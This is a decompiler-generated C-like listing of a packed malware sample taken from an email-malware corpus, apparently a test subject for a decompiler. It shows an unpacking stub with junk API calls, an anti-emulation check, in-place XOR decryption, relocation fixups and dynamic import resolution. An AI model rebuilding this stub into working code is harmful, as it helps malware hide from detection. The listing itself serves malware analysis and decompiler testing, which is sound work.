// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0107/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 edx)
{
fn00401000_entry:
l00401000:
	Eq_2 * esi_387 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000025 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_2 * ebx_15 = null
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l00401122
l0040111F:
	esi_387 = esi_387 - 0x00000022;
l00401122:
	Eq_245 * ecx_399 = null
l00401127:
	branch ebx_15 != esi_387 l00401130
l0040112E:
	ebx_15 = null;
l00401130:
	byte v15_417 = ecx_399->b4012B0 ^ ebx_15->b404000
	ecx_399->b4012B0 = v15_417;
	ecx_399 = ecx_399 + 1;
	ebx_15 = ebx_15 + 1;
	branch ecx_399 <u (Eq_245 *) 0x00001420 l00401127
l0040114A:
	Eq_268 * edx_427 = &globals->t402590
	up32 dwLoc0C_430 = 0x00000000
l00401170:
	word32 eax_438 = edx_427->dw0004
	Eq_297 * ecx_445 = &edx_427->t0008
	branch eax_438 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004011A7
l0040117F:
	uint32 esi_642 = eax_438 - 0x00000008 >>u 0x00000001
l00401181:
	branch (ecx_445->w0000 & 0xF000) != 0x3000 l0040119F
l0040118E:
	Eq_304 * eax_660 = ((word32) ecx_445->w0000 & 0x00000FFF) + edx_427->dw0000
	eax_660->dw401030 = eax_660->dw401030 + 0xF0401030;
l0040119F:
	ecx_445 = ecx_445 + 1;
	esi_642 = esi_642 - 0x00000001;
	branch esi_642 != 0x00000000 l00401181
l004011A7:
	word32 eax_450 = edx_427->dw0004
	up32 ecx_452 = dwLoc0C_430 + eax_450
	Eq_278 * edx_453 = edx_427 + eax_450
	branch ecx_452 <u 0x000000E4 l00401170
	word32 eax_457 = edx_453->dw0004
	up32 ecx_459 = ecx_452 + eax_457
	edx_427 = edx_453 + eax_457;
	dwLoc0C_430 = ecx_459;
	branch ecx_459 <u 0x000000E4 l00401170
l004011BE:
	branch globals->dw401D9C == 0x00000000 l0040126E
	Eq_335 * ebx_469 = &globals->t401D8C
	Eq_335 * dwLoc0C_470 = &globals->t401D8C
	ebx_500 = ebx_469;
	branch globals->dw401D9C == 0x00000000 l0040126E
l004011D5:
	Eq_335 * ebx_500
	Eq_353 eax_505 = LoadLibraryA(ebx_500->dw000C + 0x00401030)
	CloseHandle(0x00000062)
	CloseHandle(0x00000062)
	branch eax_505 == 0x00000000 l0040125D
	Eq_353 eax_524 = LoadLibraryA(ebx_500->dw000C + 0x00401030)
	CloseHandle(0x00000062)
	CloseHandle(0x00000062)
	branch eax_524 == 0x00000000 l0040125D
l004011FC:
	branch ebx_500->dw0000 != 0x00000000 l00401205
	word32 ebp_563 = ebx_500->dw0000
	branch ebp_563 != 0x00000000 l00401205
l00401202:
	ebp_563 = ebx_500->dw0010;
l00401205:
	Eq_407 * ebp_569 = ebp_563 + 0x00401030
	Eq_410 * ebx_570 = ebx_500->dw0010 + 0x00401030
	branch ebp_569->dw0000 == 0x00000000 l00401259
l00401212:
	int32 eax_603 = ebp_569->dw0000
	word16 ax_605 = (word16) eax_603
	branch eax_603 >= 0x00000000 l00401234
l0040121C:
	ebx_570->dw0000 = GetProcAddress(eax_524, (word32) ax_605);
	goto l00401246
l00401234:
	ebx_570->dw0000 = GetProcAddress(eax_524, eax_603 + 0x00401032);
l00401246:
	ebp_569 = ebp_569 + 1;
	ebx_570 = ebx_570 + 1;
	branch ebp_569->dw0000 != 0x00000000 l00401212
l00401259:
	ebx_500 = dwLoc0C_470;
l0040125D:
	ebx_500 = ebx_500 + 1;
	dwLoc0C_470 = ebx_500;
	branch ebx_500->dw0010 != 0x00000000 l004011D5
l0040126E:
	0x00401A80()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

